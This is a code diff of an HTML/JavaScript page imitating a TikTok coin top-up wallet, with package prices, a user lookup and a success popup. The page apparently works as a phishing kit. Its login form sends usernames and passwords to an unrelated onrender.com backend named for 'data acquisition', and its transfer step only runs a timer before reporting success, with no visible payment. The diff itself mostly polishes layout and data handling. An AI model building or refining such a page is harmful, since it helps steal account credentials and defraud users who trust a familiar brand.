@@ -28,7 +28,6 @@ body{background:#ffffff;}
 .amountItem.active{border:2px solid #fe2c55;}
 .numText{font-size:16px;font-weight:bold;display:flex;align-items:center;justify-content:center;gap:6px;}
 .coin-icon{width:20px;height:20px;background:#ffb800;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:bold;font-size:12px;}
-.coin-icon::before{content:"♪";}
 .priceText{font-size:12px;color:#999;margin-top:2px;}
 .customInput{width:calc(100% - 32px);margin:12px 16px;padding:10px;border-radius:10px;border:1px solid #ddd;}
 .tipText{display:none;}
@@ -64,11 +63,11 @@ body{background:#ffffff;}
   <h2>Wallet Login</h2>
   <div class="form-item">
     <label>Username</label>
-    <input id="login_user" placeholder="Enter username">
+    <input id="login_user" placeholder="Enter your username">
   </div>
   <div class="form-item">
     <label>Password</label>
-    <input type="password" id="login_pwd" placeholder="Enter password">
+    <input type="password" id="login_pwd" placeholder="Enter your password">
   </div>
   <button class="login-btn" onclick="doLogin()">Login</button>
   <div class="error" id="err_msg"></div>
@@ -77,17 +76,17 @@ body{background:#ffffff;}
 <div id="app" style="display:none;">
 <div class="headerWrap">
   <h2>Wallet</h2>
-  <div class="headIcons">⋯ ?</div>
+  <div class="headIcons">⚙️</div>
 </div>
 
 <div class="searchInputWrap">
-  <input class="searchInput" id="usernameInp" placeholder="Enter TikTok Username" oninput="loadTikTokUser()">
-  <div class="searchTip" id="searchTip">Please enter the TikTok account you want to top up</div>
+  <input class="searchInput" id="usernameInp" placeholder="Please enter the TikTok account you want to top up" oninput="loadTikTokUser()">
+  <div class="searchTip" id="searchTip"></div>
 </div>
-<div class="loading-text" id="loading">Loading user data, please wait...</div>
+<div class="loading-text" id="loading">Loading user data...</div>
 
 <div class="user-section">
-  <img id="avatar" class="avatar">
+  <img id="avatar" class="avatar" src="" alt="avatar">
   <div class="user-info">
     <div id="showUser">@username</div>
     <div class="user-stats">
@@ -99,29 +98,46 @@ body{background:#ffffff;}
 </div>
 
 <div class="sectionTitle">Select Amount</div>
-
 <div class="amountGrid">
   <div class="amountItem active" data-coins="30" data-cost="$0.31" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>30</div><div class="priceText">$0.31</div>
+    <div class="numText">
+      <span class="coin-icon">🪙</span> 30
+    </div>
+    <div class="priceText">$0.31</div>
   </div>
   <div class="amountItem" data-coins="350" data-cost="$3.65" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>350</div><div class="priceText">$3.65</div>
+    <div class="numText">
+      <span class="coin-icon">🪙</span> 350
+    </div>
+    <div class="priceText">$3.65</div>
   </div>
-  <div class="amountItem" data-coins="700" data-cost="$7.25" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>700</div><div class="priceText">$7.25</div>
+  <div class="amountItem" data-coins="700" data-cost="$7.3" onclick="choose(this)">
+    <div class="numText">
+      <span class="coin-icon">🪙</span> 700
+    </div>
+    <div class="priceText">$7.30</div>
   </div>
   <div class="amountItem" data-coins="1400" data-cost="$14.49" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>1400</div><div class="priceText">$14.49</div>
+    <div class="numText">
+      <span class="coin-icon">🪙</span> 1400
+    </div>
+    <div class="priceText">$14.49</div>
   </div>
   <div class="amountItem" data-coins="3500" data-cost="$36.20" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>3500</div><div class="priceText">$36.20</div>
+    <div class="numText">
+      <span class="coin-icon">🪙</span> 3500
+    </div>
+    <div class="priceText">$36.20</div>
   </div>
-  <div class="amountItem" id="customItem" onclick="switchCustomMode()">
-    <div class="numText">Custom</div>
+  <div class="amountItem" data-coins="7000" data-cost="$72.40" onclick="choose(this)">
+    <div class="numText">
+      <span class="coin-icon">🪙</span> 7000
+    </div>
+    <div class="priceText">$72.40</div>
   </div>
 </div>
 
-<input type="number" class="customInput" id="customCoins" placeholder="Custom Coins">
+<input type="text" class="customInput" id="customCoins" placeholder="Custom Coins">
 <div class="tipText">Add this page to your home screen for faster access</div>
 <button class="submitBtn" onclick="startTransfer()">🔒 Continue</button>
 
@@ -150,7 +166,7 @@ body{background:#ffffff;}
 </div>
 
 <script>
-// ✅ 已100%匹配你的前后端地址
+// ✅ 已绑定你的新后端地址
 const API_BASE = "https://tiktok-data-acquisitio.onrender.com";
 
 async function loadTikTokUser() {
@@ -171,15 +187,17 @@ async function loadTikTokUser() {
     const data = await resp.json();
     if (data.code === 0 && data.data) {
       const d = data.data;
-      document.getElementById('showUser').innerText = d.nickname || user;
-      document.getElementById('avatar').src = d.avatar || '';
-      document.getElementById('videos').innerText = (d.video_count || 0) + ' videos';
-      document.getElementById('followers').innerText = (d.follower_count || 0) + ' followers';
-      document.getElementById('following').innerText = (d.following_count || 0) + ' following';
+      document.getElementById('showUser').innerText = d.user.nickname || user;
+      document.getElementById('avatar').src = d.user.avatarThumb || '';
+      document.getElementById('videos').innerText = (d.stats.videoCount || 0) + ' videos';
+      document.getElementById('followers').innerText = (d.stats.followerCount || 0) + ' followers';
+      document.getElementById('following').innerText = (d.stats.followingCount || 0) + ' following';
     }
-  } catch (e) { }
-
-  document.getElementById('loading').style.display = 'none';
+  } catch (e) {
+    console.error("Error loading user data:", e);
+  } finally {
+    document.getElementById('loading').style.display = 'none';
+  }
 }
 
 async function doLogin() {
@@ -191,7 +209,7 @@ async function doLogin() {
   }
 
   try {
-    const res = await fetch(API_BASE + "/api/login", {
+    const res = await fetch(`${API_BASE}/api/login`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ username: user, password: pwd })
@@ -253,6 +271,10 @@ async function startTransfer() {
       clearInterval(timer);
       document.getElementById('loadingPop').style.display = "none";
       document.getElementById('successPop').style.display = "flex";
+      document.getElementById('popContent').innerHTML = `
+        Amount: ${coin} Coins (${price})<br>
+        Recipient: ${document.getElementById('showUser').innerText}
+      `;
     }
   }, 1000);
 }
@@ -262,8 +284,8 @@ function closeAllPop() {
 }
 
 window.onload = function(){
-  const u = localStorage.getItem("last_user");
-  if(u) document.getElementById("login_user").value = u;
+  const savedUser = localStorage.getItem("last_user");
+  if(savedUser) document.getElementById("login_user").value = savedUser;
 };
 </script>
 </body>
